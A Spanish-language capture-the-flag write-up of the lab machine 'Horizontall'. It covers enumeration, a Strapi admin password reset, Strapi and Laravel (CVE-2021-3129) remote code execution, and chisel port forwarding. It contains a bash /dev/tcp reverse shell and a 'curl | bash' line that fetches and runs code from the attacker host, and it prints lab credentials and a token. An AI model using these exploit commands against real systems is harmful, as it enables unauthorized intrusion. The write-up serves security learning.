# Horizontal

```bash
sudo nmap -p- --open -sCV --min-rate=5000 -n 10.129.27.210 -oN nmapResult.txt
```

![](../../assets/img/Pasted_image_20260504170802.png)

- /etc/hosts -> horizontall.htb

- Launchpad -> Bionic

- whatweb

![](../../assets/img/Pasted_image_20260504171305.png)

nginx 1.14.0

- gobuster -> no parece haber ningún recurso interesante
- subdominios
```bash
wfuzz -c -t 200 --hc=301 -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.horizontall.htb" http://horizontall.htb
```

- *api-prod*.horizontall.htb

![](../../assets/img/Pasted_image_20260504172033.png)

- Añadir a */etc/hosts*

- volvemos a usar gobuster sobre este subdominio ahora
```bash
gobuster dir -u http://api-prod.horizontall.htb -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x html,php,txt
```

![](../../assets/img/Pasted_image_20260504173031.png)

- Nada en /robot.txt

![](../../assets/img/Pasted_image_20260504173709.png)

- En /reviews encontramos un JSON con comentarios de clientes sobre los productos

![](../../assets/img/Pasted_image_20260504173549.png)

Posibles usuarios -> john,doe,wail

- En /admin encontramos un portal de acceso mediante credenciales

![](../../assets/img/Pasted_image_20260504173415.png)

- Investigaremos sobre strapi

![](../../assets/img/Pasted_image_20260504173738.png)

- Buscaremos exploits sobre strapi

![](../../assets/img/Pasted_image_20260504174028.png)

Vemos varios pero no sabemos la versión de *strapi*
- No parece funcionar ninguno

- Con metasploit
Encontramos un exploit *scanner/http/strapi_3_password_reset*
- set NEW_PASSWORD 1234
- set RHOSTS api-prod.horizontall.htb

![](../../assets/img/Pasted_image_20260504180755.png)

Parece que hemos hecho un cambio de contraseña correcto para admin@horizontall.htb a 1234
- Nos loggeamos correctamente

![](../../assets/img/Pasted_image_20260504181020.png)

- En File upload se puede subir un archivo que al parecer se sube a la ruta http://api-prod.horizontall.htb/uploads/'hash'.'extension'
- No interpreta código parece

- Buscamos exploits de RCE vistos anteriormente pero ahora sí tenemos JWT en storage del F12*eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNzc3OTEwOTg4LCJleHAiOjE3ODA1MDI5ODh9.yI3zRxuWPC14ze48IauCltcsXs9LOK4cnUf1kTSlgdI*

- Encontramos un exploit con searchsploit que nos permite hacer RCE directamente es el *Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated) | multiple/webapps/50239.py*

```bash
python3 50239.py http://api-prod.horizontall.htb
```

![](../../assets/img/Pasted_image_20260505183238.png)

- Intentaremos lanzarnos un oneliner para obtener revshell
Nos ponemos a la escucha en nuestra máquina de trazas icmp para ver si se están ejecutando comandos aunque no devuelva respuesta
```bash
sudo tcpdump -i tun0 icmp -n
```

![](../../assets/img/Pasted_image_20260505183441.png)

Efectivamente se lanzan con
```bash
ping -c 4 10.10.15.36
```

hacia nuestra máquina

```bash
bash -c 'bash -i >&/dev/tcp/10.10.15.36/443 0>&1'
```

strapi

## Escalada

En /myapi/config/environments/development encontramos un archivo *database.json*

![](../../assets/img/Pasted_image_20260506172217.png)

Credenciales para mysql
developer:#J!:F9Zt2u

- Nos conectamos a la db con mysql
```bash
mysql -u developer -p
```

Accedemos con la contraseña

```sql
show databases;
```

![](../../assets/img/Pasted_image_20260506172621.png)

Dentro de la db *strapi*
```sql
select * from strapi_administrator
```

![](../../assets/img/Pasted_image_20260506173826.png)

Es la contraseña que hemos cambiado con el exploit de strapi no nos sirve para mucho

- Buscaremos otra forma
Si enumeramos puertos abiertos

![](../../assets/img/Pasted_image_20260506174318.png)

Si lanzamos un curl al puerto 8000 que no esta abierto desde fuera (no aparecía en nmap)
```bash
curl GET http://localhost:8000
```

Vemos que es una web o algo parecido, montada con *Laravel v8 (PHP v7.4.18)*

- Nos lanzaremos un Remote Port Forwarding para redirigir el tráfico del puerto 8000 de la máquina víctima hacia nuestra máquina atacante para ver esta web
Nos copiamos chisel al directorio de nuestra máquina Horizontall, y lo pasamos a la MV por servidor web
```bash
chmod +x chisel
```

- En K -> montamos servidor a la escucha en el puerto que queramos con chisel para recibir el tráfico
```bash
./chisel server --reverse -p 1234
```

- EN MV -> reenviamos el tráfico con chisel para que el puerto 8000 de nuestra máquina sea el puerto 8000 de la máquina víctima (127.0.0.1)
```bash
./chisel client 10.10.15.36:1234 R:8000:127.0.0.1:8000
```

- En el buscador vemos el contenido si conectamos con *localhost:8000*

![](../../assets/img/Pasted_image_20260506175913.png)

- Encontramos un exploit de RCE para *Laravel* -> https://github.com/nth347/CVE-2021-3129_exploit
```bash
python3 exploit_laravel.py http://localhost:8000 Monolog/RCE1 whoami
```

![](../../assets/img/Pasted_image_20260506180837.png)

- Nos creamos un index.html para que la máquina víctima lo interprete y nos ejecute una bash con root

![](../../assets/img/Pasted_image_20260506181558.png)

- Ponemos un servidor http a la escucha en ese directorio para recoger el archivo index
```bash
python3 -m http.server 80
```

- Ponemos en escucha el puerto 4444 con
```bash
nc -nlvp 4444
```

para que nos lance la shell con root

- Ejecutamos
```bash
python3 exploit_laravel.py http://localhost:8000 Monolog/RCE1 'curl 10.10.15.36 | bash'
```

- El
```bash
| bash
```

es para interpretar con una shell el index.html

root
